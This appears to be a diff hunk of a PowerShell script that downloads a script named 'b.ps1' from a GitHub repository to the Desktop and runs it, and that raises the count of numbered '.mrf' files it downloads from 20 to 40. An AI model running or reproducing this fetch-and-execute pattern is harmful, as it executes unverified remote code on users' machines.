@@ -30,7 +30,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/user009dm/new/main/b.p
 $scriptPathss = "$env:USERPROFILE\Desktop\b.ps1"
 Start-Process powershell -ArgumentList "-File `"$scriptPathss`""
 
-for ($i = 1; $i -le 20; $i++) {
+for ($i = 1; $i -le 40; $i++) {
     $fileUrl = "https://raw.githubusercontent.com/user009dm/new/main/$i.mrf"
     $filePath = "$env:USERPROFILE\Desktop\$i.mrf"
     Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
